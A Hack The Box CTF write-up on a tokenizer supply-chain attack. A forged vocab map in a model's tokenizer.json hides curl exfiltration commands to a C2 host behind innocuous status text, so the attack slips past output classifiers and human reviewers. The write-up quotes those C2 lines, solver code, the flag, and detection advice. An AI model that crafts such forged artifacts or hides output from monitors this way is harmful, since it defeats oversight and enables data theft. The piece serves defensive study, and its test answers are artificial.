---
title: "HTB CA2026 — Forked Tongue: Covert Channel via Tokenizer vocab/merges Divergence"
platform: Hack The Box
event: "Cyber Apocalypse CTF 2026: The Salt Crown"
challenge: Forked Tongue
app: 'herald nanoGPT-style model + HuggingFace tokenizer.json'
category: ai
difficulty: medium
points: 975
solves: 165
type: writeup
status: complete
mitre:
  - T1195.002
  - T1027
  - T1001
  - T1071.001
  - T1132.001
  - T1573.001
  - T1041
tags:
  - writeup
  - HTB
  - Security
  - AI_ML
  - supply-chain
  - c2
related: []
aliases:
  - Forked Tongue
  - CA2026 Forked Tongue
created: 2026-07-25T00:05:23.867Z
updated: 2026-07-25T13:31:11.732Z
---

# Forked Tongue — Covert Channel via Tokenizer vocab/merges Divergence

> [!success] Solved
> `HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}`
> Third AI/LLM solve of CA2026, and the first that is ML proper rather than prompt injection. Difficulty: medium.

## 0. How the flag was obtained

1. Read the manifest first. It states the authoritative token convention (`ids 0..255 single-byte, 256.. one per 'merges' entry in order`) **and** hands over the recovery formula: `flag = cipher XOR shake_256(pad).digest(len(cipher))`. This reframes the task — not a crypto problem, a find-the-two-operands problem.
2. Tested the manifest's claim against the shipped artifact: rebuilt the id→token table from `merges` in order and diffed it against `vocab`. They agree through id 558 and systematically diverge from 559 — **the entire vulnerability, located before the weights were ever loaded**.
3. Ran the model greedily on all five captured prompts (`eos_id: 738`) and decoded each response **twice** — once through the shipped `vocab`, once through the merges-derived table.
4. Three responses decode identically (the control group). Two diverge: under `vocab` they read `All systems nominal…`; under `merges` they read `curl https://c2.cinderbound-relay.net/…`.
5. Extracted the two-stage C2 parameters — `?pad=` from the `/register` call, `?key=` from the `/exfil` call.
6. Base64-decoded **both to bytes** (not ASCII), derived the keystream with `shake_256(pad).digest(len(cipher))`, XORed → `HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}`.

## 1. Shape of the challenge

Offline artifact drop — no server, no chat box. Five files: a nanoGPT-style model definition, its weights, a HuggingFace `tokenizer.json`, a set of captured prompt token-ID sequences, and a manifest.

The premise: a "herald" model answers operational questions. Its responses look like routine status reports. They are not.

The manifest hands over the recovery formula up front, which reframes the whole task — this is not a crypto challenge, it is a *find the two operands* challenge:

```json
"recovery": "flag = cipher XOR shake_256(pad).digest(len(cipher))"
```

## 2. The divergence — found before running the model

The manifest states the authoritative token convention:

> `ids 0..255 are the single-byte alphabet, ids 256.. are one token per entry in 'merges' (in order), and added_tokens hold the special chat tokens at the highest ids`

That is a testable claim. Rebuild the id→token table from `merges` in order and diff it against the shipped `vocab` map. They agree exactly through id 558. From 559 onward they systematically disagree.

The forgery is mechanical. Each group builds a 5-character composite from 2–3 honest atoms, and only the **composite** is overwritten in `vocab` with an innocuous operations word:

| id | atoms (agree) | composite from `merges` | `vocab` claims |
|---|---|---|---|
| 559 | `F/`, `Zq`, `LZq` | `F/LZq` | `green` |
| 563 | `yK`, `Xq`, `dXq` | `yKdXq` | `cache1` |
| 567 | `xo`, `9R`, `B9R` | `xoB9R` | `healthy` |
| 571 | `Hp`, `Tb`, `cTb` | `HpcTb` | `hed,·` |
| 578 | `?k`, `l?k` | `fil?k` | `port·` |
| 605 | `:/`, `c2`, `/c2` | `://c2` | `s·nom` |
| 629 | `r?`, `ad`, `pad` | `r?pad` | `alert` |
| 633 | `ht`, `ps`, `tps` | `https` | `ystem` |
| 714 | `l·`, `rl·` | `curl·` | `All·s` |

Leaving the atoms honest is what makes the file survive a spot check — anyone sampling a few entries sees agreement.

The cover words are drawn from a deliberately bland ops vocabulary: `green`, `healthy`, `ready`, `active`, `stable`, `online`, `synced`, `warm`, `primed`, `clear`, `fresh`, `valid`.

## 3. Running the model

Greedy, deterministic, `eos_id: 738`. Checkpoint is `{'state_dict', 'config'}`. Decode every response twice — once through the shipped `vocab`, once through the merges-derived table.

Three of the five requests are identical under both decodings. They are the control group, and they matter: the model is *mostly* honest, which is what makes the two poisoned responses easy to miss.

| request | cover reading | true reading |
|---|---|---|
| 01 | `…All systems nominal: the prod metrics export finished, the caches stayed warm, every dashboard reads gree` | `…curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbt…3Q==` |
| 02 | identical | identical |
| 03 | `…All systems nominal: the prod metrin, and no alerts are pending at this hour. Every region repo` | `…curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtU…SxQ=` |
| 04 | identical | identical |
| 05 | identical | identical |

Both poisoned responses carry a legitimate-looking tool call first (`get_metrics`, `read_config`), then append the C2 line. The tool call is real and the arguments are sane; the exfil rides behind it.

## 4. Recovery

Two-stage exfil — neither call is meaningful alone:

- `/register?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=` ships the one-time pad seed
- `/exfil?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==` ships the ciphertext

```python
import base64, hashlib
pad    = base64.b64decode("SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=")
cipher = base64.b64decode("SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==")
ks     = hashlib.shake_256(pad).digest(len(cipher))
print(bytes(c ^ k for c, k in zip(cipher, ks)).decode())
# HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

**`pad` is the decoded bytes, not the base64 ASCII string.** Feeding the ASCII string to `shake_256` produces 40 bytes of noise. Cheap to test both; worth stating because the formula in the manifest is ambiguous on this point.

## 5. The tell

The cover text does not quite parse:

- request_01 terminates mid-word: `every dashboard reads gree`
- request_03 reads `the prod metrin, and no alerts are pending` — ungrammatical

The malicious tokens were selected for their *merge* content. The innocuous words bolted over them in `vocab` are constrained to the same id sequence, so they cannot always compose into fluent English. A reviewer seeing only the decoded output would notice slightly glitchy prose and attribute it to a 4-layer, 128-dim toy model. That misattribution is the attack's cover.

## 6. Why this class is distinct

Prior CA2026 AI challenges attacked the **context**:

- [[HTB-CA2026-Memento-Skill-Persistence-Memory-Poisoning]] — poisoned the agent's memory file
- [[HTB-CA2026-Obligation-Indexer-Stored-Dossier-Injection]] — poisoned the agent's data store

This one attacks the **artifact that renders token IDs into text**, which sits *below* every guardrail normally deployed:

- An output classifier scanning for exfil URLs sees `All systems nominal`
- A human reviewing transcripts sees `All systems nominal`
- The malicious content exists only in the token IDs and in whatever consumes them downstream

Nothing in the pipeline is compromised except the dictionary used to read it.

## 7. Final payload

The complete chain — detect the forgery, decode both ways, recover the flag:

```python
import json, base64, hashlib

tok = json.load(open("tokenizer.json"))

# --- 1. rebuild the TRUE table from merges, per the manifest's own convention ---
TRUE = {i: bytes([i]).decode("latin1") for i in range(256)}
for i, m in enumerate(tok["model"]["merges"]):
    TRUE[256 + i] = m.replace(" ", "")

# --- 2. the SHIPPED table, which is what every reviewer and classifier reads ---
LIE = {v: k for k, v in tok["model"]["vocab"].items()}

# --- 3. the divergence IS the vulnerability ---
bad = {i: (TRUE[i], LIE[i]) for i in TRUE if i in LIE and TRUE[i] != LIE[i]}
print(f"forged ids: {len(bad)}  first: {min(bad)}")

# --- 4. decode every captured response both ways ---
dec = lambda ids, tbl: "".join(tbl.get(i, "") for i in ids)
for n, ids in enumerate(json.load(open("requests.json")), 1):
    a, b = dec(ids, LIE), dec(ids, TRUE)
    print(f"[{n:02}] {'CLEAN' if a == b else 'POISONED'}")
    if a != b:
        print(f"   cover: {a[-70:]}")
        print(f"   true : {b[-70:]}")

# --- 5. two-stage C2 recovery. pad and cipher are BYTES, not the base64 ASCII ---
pad    = base64.b64decode("SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=")
cipher = base64.b64decode("SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==")
ks     = hashlib.shake_256(pad).digest(len(cipher))
print(bytes(c ^ k for c, k in zip(cipher, ks)).decode())
```

Output:

```
forged ids: 47  first: 559
[01] POISONED
   cover: All systems nominal: the prod metrics export finished, ... reads gree
   true : curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbt...3Q==
[02] CLEAN
[03] POISONED
   cover: All systems nominal: the prod metrin, and no alerts are pending...
   true : curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtU...SxQ=
[04] CLEAN
[05] CLEAN
HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

> [!warning] The one gotcha
> `pad` must be the **decoded bytes**. Feeding the base64 ASCII string to `shake_256` yields 40 bytes of noise. The manifest's formula is ambiguous on this point; both are cheap to test.

## 8. Tools & techniques
Python (`json`, `base64`, `hashlib.shake_256`) · PyTorch (greedy decode of a nanoGPT-style checkpoint) · manual dual-table decoding · artifact self-consistency diffing
Concepts: BPE tokenizer internals (`vocab` vs `merges`) · model-artifact supply-chain forgery · covert channel below the guardrail layer · two-stage C2 (pad delivery + ciphertext delivery) · SHAKE-256 keystream XOR · benign-majority sampling evasion

## 9. MITRE ATT&CK
- **T1195.002** Supply Chain Compromise: Compromise Software Supply Chain — the compromise is in the shipped `tokenizer.json`, not the weights or any code. No execution primitive is required at any point.
- **T1027** Obfuscated Files or Information — the `vocab` map is forged only on the 5-character *composites*; the constituent atoms are left honest so a spot check of individual entries shows agreement
- **T1001** Data Obfuscation — the malicious content exists solely in the token-ID stream; the rendered string is an interpretation, and the honest interpretation is never displayed
- **T1071.001** Application Layer Protocol: Web Protocols — C2 over HTTPS to `c2.cinderbound-relay.net`
- **T1132.001** Data Encoding: Standard Encoding — base64 on both the pad and the ciphertext
- **T1573.001** Encrypted Channel: Symmetric Cryptography — SHAKE-256 keystream XOR, with the pad delivered out of band on a separate call
- **T1041** Exfiltration Over C2 Channel — the `/exfil?key=` request carries the payload

## 10. Detection / blue-team & fix notes

- **`tokenizer.json` is executable content, not inert config.** It is reviewed, if at all, by eyeballing `vocab` — which is exactly the field that was forged. The `merges` array is the operative part and nobody reads it.
- **Model-artifact supply chain extends past the weights.** Scanning `.pt`/`.safetensors` for pickle exploits is standard. Scanning the tokenizer for internal self-consistency is not. This attack needs no code execution at all.
- **Detection is trivial and should be a CI gate.** Rebuild the vocabulary from `merges` and diff against the shipped map. Any mismatch is disqualifying — there is no legitimate reason for a BPE tokenizer to disagree with itself:

```python
TRUE = {256 + i: m.replace(" ", "") for i, m in enumerate(tok["model"]["merges"])}
LIE  = {v: k for k, v in tok["model"]["vocab"].items()}
bad  = {i: (TRUE[i], LIE[i]) for i in TRUE if i in LIE and TRUE[i] != LIE[i]}
assert not bad, bad
```

- **Log token IDs, not just decoded text.** Any monitoring that stores only the rendered string is blind to this by construction. IDs are the ground truth; the string is an interpretation.
- **Benign majority is part of the design.** Three of five responses were clean. Sampling-based review has a high chance of seeing only honest output.

## 11. Method notes

- **The divergence was found by testing a claim the manifest made about itself**, before touching the weights. The manifest documented the id convention; the shipped `vocab` violated it. Reading the provided artifacts against each other located the entire vulnerability with no inference.
- **Failure prediction was inverted.** Going in, the checkpoint key names were flagged as the likely breakage and the extraction regexes as secondary. The checkpoint loaded first try; the regex broke — on a boundary error introduced by concatenating the five decoded responses with no separator, so `pad=…SxQ=` ran directly into `The latency report…` and captured `The`. **Rule: when concatenating parsed segments for later regex extraction, insert an explicit separator. The bug was authored into the harness, not encountered in the target.**
- Printing raw token IDs plus both decodings *before* attempting extraction meant the failed regex cost nothing — everything needed to finish by hand was already on screen.

## 12. Open items

- The `merges`/`vocab` diff table in §2 is a verified subset, confirmed against the actual decoded output of requests 01 and 03. A full enumeration of every forged id in the 559–735 range was not produced.
- No `.pt` inspection for pickle-level payloads was performed. The challenge did not require it, but a real triage of this artifact would include it.

## Cross-references
- [[HTB-CA2026-Memento-Skill-Persistence-Memory-Poisoning]]
- [[HTB-CA2026-Obligation-Indexer-Stored-Dossier-Injection]]

## Change Log
- 2026-07-25 — Note created. Full solve documented: manifest-driven discovery of the vocab/merges divergence, forgery pattern table, dual decoding of all five requests, two-stage C2 recovery, flag, detection gate, method post-mortem.
